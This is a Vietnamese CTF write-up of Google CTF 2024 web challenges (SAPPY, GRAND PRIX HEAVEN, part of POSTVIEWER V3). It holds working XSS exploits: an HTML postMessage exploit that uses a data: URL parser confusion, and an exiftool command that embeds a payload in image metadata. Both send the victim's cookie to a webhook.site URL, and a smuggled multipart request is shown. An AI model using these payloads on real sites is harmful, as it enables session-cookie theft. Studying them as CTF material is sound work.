    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/7627fe64-f9e1-4d77-ba65-9bae8ce38e52" alt="image" />
    
  </figure>
</p>
<p>Đây sẽ là writeup của mình về những bài đã giải được (3 bài đầu) và cả những bài mình ngồi giải lại sau giải (2 bài sau), hi vọng nó sẽ giúp ích cho các bạn.</p>


<h2 class="relative group">SAPPY 
    <div id="sappy" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#sappy" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<p>Ở bài này ta thấy tính năng của web là khi ta click vào 1 trong 4 nút bấm thì sẽ có 1 iframe xuất hiện để hiển thị output tương ứng với từng nút</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/ce790035-de14-4171-a8eb-cb77927bd86c" alt="image" />
    
  </figure>
</p>
<p>Trong file <code>sap.html</code> thì nội dung quan trọng sẽ ở trong đoạn sau:</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/558d5711-afd5-4b30-9d47-d7ea535b3fb3" alt="image" />
    
  </figure>
</p>
<p>Trong file <code>sap.js</code> sẽ có một message handler</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nb">window</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">  <span class="s2">&#34;message&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="kr">async</span> <span class="p">(</span><span class="nx">event</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">data</span> <span class="o">=</span> <span class="nx">event</span><span class="p">.</span><span class="nx">data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">data</span> <span class="o">!==</span> <span class="s2">&#34;string&#34;</span><span class="p">)</span> <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">data</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">method</span> <span class="o">=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">method</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">switch</span> <span class="p">(</span><span class="nx">method</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">case</span> <span class="s2">&#34;initialize&#34;</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">data</span><span class="p">.</span><span class="nx">host</span><span class="p">)</span> <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">API</span><span class="p">.</span><span class="nx">host</span> <span class="o">=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">host</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="k">case</span> <span class="s2">&#34;render&#34;</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">data</span><span class="p">.</span><span class="nx">page</span> <span class="o">!==</span> <span class="s2">&#34;string&#34;</span><span class="p">)</span> <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">url</span> <span class="o">=</span> <span class="nx">buildUrl</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">          <span class="nx">host</span><span class="o">:</span> <span class="nx">API</span><span class="p">.</span><span class="nx">host</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">          <span class="nx">page</span><span class="o">:</span> <span class="nx">data</span><span class="p">.</span><span class="nx">page</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="p">});</span>
</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">resp</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">fetch</span><span class="p">(</span><span class="nx">url</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">resp</span><span class="p">.</span><span class="nx">status</span> <span class="o">!==</span> <span class="mi">200</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="s2">&#34;something went wrong&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">          <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">json</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">resp</span><span class="p">.</span><span class="nx">json</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">json</span><span class="p">.</span><span class="nx">html</span> <span class="o">===</span> <span class="s2">&#34;string&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="nx">output</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">json</span><span class="p">.</span><span class="nx">html</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="kc">false</span>
</span></span><span class="line"><span class="cl"><span class="p">);</span>
</span></span></code></pre></div><p>Rất nhanh chóng ta xác định được một sink quen thuộc đó là <code>innerHTML</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">output</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">json</span><span class="p">.</span><span class="nx">html</span><span class="p">;</span>
</span></span></code></pre></div><p>để chạm được nhánh <code>case</code> này ta sẽ cần postMessage một đoạn JSON với thuộc tính <code>method</code> là <code>render</code>, trước đó ta cũng cần control được <code>API.host</code> (thông qua method <code>initialize</code>) để làm web fetch payload của ta về và gán cho <code>innerHTML</code>.</p>
<p>Trước đó thì ta sẽ cần bypass được <code>validate</code> được gọi khi ta cố gắng trigger <code>render</code> nhằm kiểm tra xem domain có phải là <code>sappy-web.2024.ctfcompetition.com</code> không</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/72d63809-59f6-4a67-ae36-692b69060efd" alt="image" />
    
  </figure>
</p>
<p>Ta thấy được rằng trước khi gọi <code>validate</code> thì url sẽ được parse bằng <code>goog.Uri.parse</code>, ta cần hiểu cách mà hàm này hoạt động</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/20447bdd-d404-4783-b23e-93fe103aa90c" alt="image" />
    
  </figure>
</p>
<p>Vào phần source của devtools để kiểm tra, ta tìm được phần khai báo constructor của object Uri</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/8f00a3c7-f5cd-4dc9-8cd6-49abc09eb668" alt="image" />
    
  </figure>
</p>
<p><code>goog.uri.utils.split</code> được gọi với tham số là <code>a</code> (<code>a</code> là url truyền vào ban đầu), ta thử xem cách <code>goog.uri.utils.split</code> hoạt động</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/1de272e3-8c9f-4ec3-b828-cc388498077e" alt="image" />
    
  </figure>
</p>
<pre tabindex="0"><code>goog.uri.utils.splitRe_ = RegExp(&#34;^(?:([^:/?#.]+):)?(?://(?:([^\\\\/?#]*)@)?([^\\\\/?#]*?)(?::([0-9]+))?(?=[\\\\/?#]|$))?([^?#]+)?(?:\\?([^#]*))?(?:#([\\s\\S]*))?$&#34;);
</code></pre><p>Vậy là url được xử lý dựa trên regex, rất nhanh ta sẽ thấy được vấn đề là phần protocol của URL không có ràng buộc phải là <code>http</code> hay <code>https</code>, ngay từ đầu việc parse URL bằng một đoạn regex thế này theo mình nghĩ đã là vấn đề, lấy ví dụ <code>https://google.com</code> thì hostname của nó là google.com, thế còn <code>file:///etc/passwd</code> thì hostname của nó là gì? Tới đây thì mình chợt nghĩ nếu như ta fetch đến <code>data:://sappy-web.2024.ctfcompetition.com</code> thì sẽ thế nào, vì cú pháp của một URL với protocol là <code>data://</code> sẽ là <code>data:[&lt;mediatype&gt;][;base64],&lt;data&gt;</code>, vậy ta có thể biến phần domain <code>sappy-web.2024.ctfcompetition.com</code> thành <code>mediatype</code> và khi fetch đến nó sẽ trả về response là <code>&lt;data&gt;</code>, đây là vấn đề parser inconsistency giữa <code>goog.URI</code> và browser</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">iframe</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">ifrm</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="s2">&#34;iframe&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nx">ifrm</span><span class="p">.</span><span class="nx">src</span><span class="o">=</span><span class="s2">&#34;https://sappy-web.2024.ctfcompetition.com/sap.html&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">ifrm</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s2">&#34;load&#34;</span><span class="p">,</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">ifrm</span><span class="p">.</span><span class="nx">contentWindow</span><span class="p">.</span><span class="nx">postMessage</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">                <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">                    <span class="s2">&#34;method&#34;</span><span class="o">:</span> <span class="s2">&#34;initialize&#34;</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">                    <span class="s2">&#34;host&#34;</span><span class="o">:</span> <span class="s2">&#34;data://sappy-web.2024.ctfcompetition.com/&#34;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}),</span> <span class="s2">&#34;https://sappy-web.2024.ctfcompetition.com&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="nx">ifrm</span><span class="p">.</span><span class="nx">contentWindow</span><span class="p">.</span><span class="nx">postMessage</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">                <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">                    <span class="s2">&#34;method&#34;</span><span class="o">:</span> <span class="s2">&#34;render&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                    <span class="s2">&#34;page&#34;</span><span class="o">:</span> <span class="s1">&#39;,{&#34;html&#34;:&#34;&lt;img src=x onerror=\\&#34;a = window.open(`https://sappy-web.2024.ctfcompetition.com/`); window.location=`https://webhook.site/cec28ede-90d8-41a4-9ef6-4f811d83e750/?c=${a.document.cookie}`\\&#34; /&gt;&#34;}&#39;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}),</span> <span class="s2">&#34;https://sappy-web.2024.ctfcompetition.com&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">})</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>Đầu tiên ta sẽ thực hiện iframe và <code>postMessage</code> đến <code>sap.html</code> sau đó set <code>API.host</code> về <code>data://sappy-web.2024.ctfcompetition.com/</code>, rồi sau đó ở <code>page</code> trong đoạn JSON ở postMessage thứ 2 ta sẽ để payload XSS vào đó, khi gọi <code>fetch</code> lên URL này thì response trả về sẽ là đoạn JSON mà ta cài vào</p>


<h2 class="relative group">GRAND PRIX HEAVEN 
    <div id="grand-prix-heaven" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#grand-prix-heaven" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<p>Bài này thì có dính server side một chút nhưng concept cũng là client side</p>


<h3 class="relative group">TL;DR 
    <div id="tldr" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#tldr" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>Lợi dụng cách parse multipart/form-data của server để smuggle một field <code>mediaparser</code> vào, <code>mediaparser</code> tồn tại một sink XSS là innerHTML, ta sẽ lợi dụng một lỗi trong câu regex để bắt nó load đến media có chứa XSS payload trong exifdata và lấy flag trong cookie của bot</p>


<h3 class="relative group">Writeup 
    <div id="writeup" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#writeup" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>Challenge gồm 2 server với heaven_server có nhiệm vụ như một proxy thực hiện các tiền xử lý trước khi forward đến <code>template_server</code> để render nên page bằng các template có sẵn</p>
<p>Đầu tiên thì ta sẽ thấy sink XSS trong file <code>mediaparser.js</code>, nhưng không như <code>apiparser.js</code> thì <code>heaven_server</code> sẽ không có phép ta load <code>mediaparser.js</code> vào và cũng như bắt buộc ta phải include CSP vào trước khi tạo faves</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/83b9cd21-c5b5-4d0c-b472-42f9b4828a4e" alt="image" />
    
  </figure>
</p>
<p>Ở phần CSP thì khá dễ bypass, thay vì array thì ta sẽ gửi một object với các key là các số theo dạng <code>{&quot;1&quot;:&quot;aaaa&quot;, ...}</code> để né index 0, để include được <code>mediaparser.js</code> thì ta sẽ nhìn vào cách mà template_server parse multipart/form-data</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/1ff4cd06-6603-4190-bf41-0f655bf7da49" alt="image" />
    
  </figure>
</p>
<p>Ta thấy server dùng <code>\r\n\r\n</code> làm delimiter để split data thành một mảng và check xem mảng đó có template key (như csp, faves, retrieve, mediaparser, &hellip;) không, nếu có thì nó sẽ include phần HTML tương ứng của template key đó vào response</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/cb30161e-5ed8-45ee-bba8-1510c79891ca" alt="image" />
    
  </figure>
</p>
<p>Vậy nếu trong key mà ta gửi lên server có dạng <code>6\r\n\r\nmediaparser\r\n\r\n</code> thì sao? Lúc này ở heaven_server nó sẽ đi qua <code>parseInt</code> và trả về giá trị 6, hợp lệ, khi đến server thì được split ra thành một mảng với delim là &ldquo;\r\n\r\n&rdquo;, lúc này array sẽ có một phần tử là <code>mediaparser</code> vì nó nằm giữa 2 delim, lúc này đoạn <code>lines.includes(item)</code> sẽ đúng và nó sẽ include <code>mediaparser</code> vào. Xong 1 phase, ở phase 2 ta sẽ tìm cách để làm cho nó load một cái media ta vừa tạo</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/f36a166a-d968-47a7-b1fe-c765fe47fea2" alt="image" />
    
  </figure>
</p>
<p>Vấn đề ta gặp phải là constructor của <code>Requester</code> sẽ chặn một vài ký tự trong URL dẫn đến ta không thể truyền full URL vào được (ta cần fetch đến route <code>/media/:mediaId</code> chứ không phải <code>/api/get-car/:carId</code>), tuy nhiên thì phần check dùng regex</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/7856dfc8-d856-496d-a349-20493cc62c8b" alt="image" />
    
  </figure>
</p>
<p>Bạn có thấy điều bất thường ở đây không? Ta không thể đưa <code>\s</code> vào trong cặp dấu <code>[...]</code> được, lúc này nó sẽ hiểu là ký tự <code>\</code> và <code>s</code> chứ không phải space, vậy nghĩa là ta sẽ có thể dùng dấu <code>\</code> nữa, khi test thì mình nhận ra nếu ta gọi <code>new URL(&quot;\\&quot;, 'http://localhost:1337/api/get-car/');</code> thì lúc này URL sẽ thành <code>http://localhost:1337/</code>, nghĩa là base path đã bị override thành công, lúc này ta có thể truyền <code>\\media\\&lt;media_id&gt;</code> để mediaparser fetch đến media ta chuẩn bị sẵn, trước đó thì ta sẽ cài payload vào file jpg bằng exiftool</p>
<pre tabindex="0"><code>exiftool -ImageDescription=&#39;&lt;img src=x onerror=&#34;window.location=`https://webhook.site/cec28ede-90d8-41a4-9ef6-4f811d83e750/?c=${document.cookie}`&#34; /&gt;&#39; Sample-jpg-image-50kb.jpg
</code></pre><p>Tạo fave:</p>
<pre tabindex="0"><code>POST /api/new-car HTTP/2
Host: grandprixheaven-web.2024.ctfcompetition.com
Content-Length: 52177
Cache-Control: max-age=0
Origin: http://localhost:1337
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryIxVOFGMKmjxYaR62
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://localhost:1337/new-fave
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

------WebKitFormBoundaryIxVOFGMKmjxYaR62
Content-Disposition: form-data; name=&#34;year&#34;

2004
------WebKitFormBoundaryIxVOFGMKmjxYaR62
Content-Disposition: form-data; name=&#34;make&#34;

Ferrari
------WebKitFormBoundaryIxVOFGMKmjxYaR62
Content-Disposition: form-data; name=&#34;model&#34;

F2004
------WebKitFormBoundaryIxVOFGMKmjxYaR62
Content-Disposition: form-data; name=&#34;custom&#34;

{
    &#34;1&#34;: &#34;retrieve&#34;,
    &#34;2&#34;: &#34;head_end&#34;,
    &#34;3&#34;: &#34;head_end&#34;,
    &#34;4&#34;: &#34;faves&#34;,
    &#34;5&#34;: &#34;footer&#34;,
		&#34;6\r\n\r\nmediaparser\r\n\r\n&#34;: &#34;apiparser&#34;
}
------WebKitFormBoundaryIxVOFGMKmjxYaR62
Content-Disposition: form-data; name=&#34;image&#34;; filename=&#34;Sample-jpg-image-50kb.jpg&#34;
Content-Type: image/jpeg

...
</code></pre><p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/ee0a2dc5-d7d6-4f13-aa4d-495265eb4f69" alt="image" />
    
  </figure>
</p>
<p>Dùng endpoint get-car để lấy id của media vừa upload</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/2f7deef7-1582-4e7a-b338-69324866f87c" alt="image" />
    
  </figure>
</p>
<pre tabindex="0"><code>https://grandprixheaven-web.2024.ctfcompetition.com/fave/yn7TOo04qgNcr4n9TivPh?F1=\media\Q65ajKjHXfTm1MN0OS-yI
</code></pre><p>Report:</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/fe1563a5-77e1-47bc-badb-643d971ac795" alt="image" />
    
  </figure>
</p>


<h2 class="relative group">POSTVIEWER V3 
    <div id="postviewer-v3" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#postviewer-v3" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<p>Thật ra mình cũng không làm client side nhiều lắm, nhưng nói chung là mình cũng khá thích nó, bài này làm mình cũng hơi mất thời gian khi đi hết từ ý tưởng này đến ý tưởng khác + với việc method mình dùng là race condition nên phải ngồi spam bot cả tiếng nó mới hit&hellip;</p>
<p>Mình sẽ nói sơ ra về bài này một chút (mình sẽ cố gắng nói sơ về context ở mỗi bài nhưng hi vọng là các bạn đã có bung đề ra và xem trước rồi, mình muốn tập trung vào phân solving hơn là mấy cái râu ria). Đầu tiên thì đây là một &ldquo;client-side file upload&rdquo;, web sẽ lưu file vào indexedDB, khi mở file thì nội dung file sẽ được render trong một &ldquo;sandboxed origin&rdquo; (<code>https://sbx-&lt;hash&gt;.postviewer3-web.2024.ctfcompetition.com</code>) thông qua iframe, bên trong iframe đó thì sẽ tiếp tục render nội dung của file thông qua một iframe trỏ đến blob URL</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/9fcd8db2-f5c8-488c-b282-9f905e7690a7" alt="image" />
    
  </figure>
</p>
<p>Goal của ta đó là con bot sẽ add một file chứa flag vào, ta cần lấy được nội dung của file đó somehow&hellip; Mình đã có đi qua nhiều ý tưởng nhưng chỉ có một idea là work nên mình sẽ trình bày về idea đó.</p>


<h3 class="relative group">safeFrameRender 
    <div id="safeframerender" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#safeframerender" aria-label="Anchor">#</a>
    </span>        
    
</h3>
<p>Đầu tiên thì ta sẽ có một bug XSS rõ ràng trong sbx origin, thật ra đây là tính năng của web để giúp cho sbx origin có thể load nội dung tùy ý (nhằm sandbox nội dung tùy ý). Tuy nhiên XSS trên origin này thì gần như không có impact gì vì cookie nằm ở origin <code>https://postviewer3-web.2024.ctfcompetition.com</code>, ta cùng đi qua cách mà web sandbox file&rsquo;s content. <code>previewFile</code> sẽ được trigger, sau đó <code>previewFile</code> sẽ tiếp tục gọi <code>safeFrameRender</code>, <code>safeFrameRender</code> sẽ hoạt động như sau:</p>
<ul>
<li>Gọi <code>calculateHash</code> để tính ra hmac để bảo đảm với một content A sẽ chỉ khớp với 1 content A'</li>
<li>Sau đó thực hiện tạo iframe tới file <code>shim.html</code> của origin vừa tạo</li>
<li>postMessage để gửi nội dung của sbx đi sau khi bên sbx origin callback về (nghĩa là khi sbx đã load xong)</li>
</ul>
<p>Sau khi xong stage này thì nội dung của sbx origin sẽ là nội dung của <code>evaluatorHtml</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&#34;utf-8&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Evaluator<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nx">onmessage</span> <span class="o">=</span> <span class="nx">e</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">source</span> <span class="o">!==</span> <span class="nx">parent</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="k">throw</span> <span class="sr">/not parent/</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">};</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">data</span><span class="p">.</span><span class="nb">eval</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">          <span class="nb">eval</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">data</span><span class="p">.</span><span class="nb">eval</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="nx">onload</span> <span class="o">=</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">parent</span><span class="p">.</span><span class="nx">postMessage</span><span class="p">(</span><span class="s1">&#39;loader ready&#39;</span><span class="p">,</span><span class="s1">&#39;*&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">style</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">      <span class="nt">body</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">padding</span><span class="p">:</span> <span class="mi">0</span><span class="kt">px</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">margin</span><span class="p">:</span> <span class="mi">0</span><span class="kt">px</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="nt">iframe</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">width</span><span class="p">:</span> <span class="mi">100</span><span class="kt">vw</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">height</span><span class="p">:</span> <span class="mi">100</span><span class="kt">vh</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">border</span><span class="p">:</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="p">.</span><span class="nc">spinner</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">background</span><span class="p">:</span> <span class="nb">url</span><span class="p">(</span><span class="sx">https://storage.googleapis.com/gctf-postviewer/spinner.svg</span><span class="p">)</span> <span class="kc">center</span> <span class="kc">no-repeat</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="p">.</span><span class="nc">spinner</span> <span class="nt">iframe</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">opacity</span><span class="p">:</span> <span class="mf">0.2</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">style</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;container&#34;</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;spinner&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>Lúc này chức năng của <code>shim.html</code> sẽ là nhận postMessage từ parent và eval data được gửi đến, bước này phục vụ cho việc parent sẽ gửi đến đoạn js lưu trong <code>iframeInserterHtml</code> để thực hiện đưa file&rsquo;s content vào bên trong iframe thông qua blob URL</p>
